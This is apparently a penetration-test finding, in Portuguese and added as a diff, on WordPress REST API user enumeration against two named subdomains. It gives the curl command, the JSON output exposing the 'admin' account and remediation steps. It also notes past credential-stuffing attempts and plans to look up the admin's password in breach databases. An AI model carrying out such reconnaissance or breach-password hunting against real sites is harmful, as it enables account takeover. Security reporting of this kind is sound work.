@@ -1,0 +1,63 @@
+# F-028 — WordPress REST API User Enumeration (admin id=1)
+
+**Alvo:** `https://acaorelampago.fernandapessoa.com.br` e `https://matriculas.fernandapessoa.com.br` (IP real 187.45.185.33)
+**Severidade:** Média (information disclosure → facilita cred-stuffing/Spraying)
+**Timestamp:** 2026-08-27T20:35 UTC
+**Classificação:** Information Disclosure (CWE-200) — User Enumeration via REST API
+
+## Reprodução
+
+```bash
+proxychains -q curl -sk "https://acaorelampago.fernandapessoa.com.br/wp-json/wp/v2/users" \
+  --resolve acaorelampago.fernandapessoa.com.br:443:187.45.185.33 --max-time 30
+```
+
+### Resposta (matriculas)
+```json
+[{"id":1,"name":"admin","url":"","description":"","link":"https:\/\/acaorelampago.fernandapessoa.com.br\/author\/admin\/","slug":"admin",...}]
+```
+
+### Resposta (acaorelampago)
+```json
+[{"id":1,"name":"admin","slug":"admin","link":"https:\/\/acaorelampago.fernandapessoa.com.br\/author\/admin\/",...}]
+```
+
+### Posts/Pages via REST API
+```
+GET /wp-json/wp/v2/posts?status=draft → 400 "O status é proibido" (drafts não expostos — bom)
+GET /wp-json/wp/v2/pages → 2 pages (publish):
+  id=17 slug=elementor-17 title=FERNANDA PESSOA
+  id=8  slug=aula-gratis  title=O SEGREDO DA REDAÇÃO
+```
+
+## Interpretação
+
+A WordPress REST API (`/wp-json/wp/v2/users`) expõe o usuário `admin` (id=1, slug=admin) sem autenticação. Isso confirma:
+1. Nome de usuário de administrador = `admin` (padrão, previsível)
+2. id=1 → conta administrador raiz do WordPress
+3. Slug `admin` → pode ser usado em ataques de cred-stuffing/spraying direcionados
+
+Nota: WP 5.3.18 NÃO restringe a REST API de usuários por padrão (restrição adicionada em versões posteriores via `?author` query ou plugins). Ambos subdomínios (matriculas e acaorelampago) compartilham a mesma instalação WP (mesmo `link` → acaorelampago).
+
+Drafts/private posts NÃO são expostos (status param proibido) — bom controle.
+
+## Impacto
+
+- Atacante sabe que o admin se chama `admin` → cred-stuffing direcionado (testado em F-025/F-029, sem sucesso — senha forte)
+- Enumeração de usuários facilita phishing direcionado (saber o nome de usuário do admin)
+- Base para ataque de senha futuro se senha vazar (breach)
+
+## Recomendação
+
+1. Restringir `/wp-json/wp/v2/users` — usar plugin (WPScan recomenda) ou `.htaccess`/nginx:
+   ```nginx
+   location ~ ^/wp-json/wp/v2/users { return 403; }
+   ```
+2. Renomear usuário `admin` para nome não-previsível (bloquear id=1 via DB)
+3. Desabilitar REST API de usuários via `add_filter('rest_authentication_errors')` ou plugin
+4. Implementar WAF/regra Cloudflare para bloquear `/wp-json/wp/v2/users`
+
+## Próximo passo
+
+- Combinar com cred-stuffing (F-025, F-029) — já testado, senha não fraca
+- Monitorar breaches/DeHashed por senha do admin se descobrir email associado (gravatar hash `a70bd3955a6394393863f09c1724352e`)
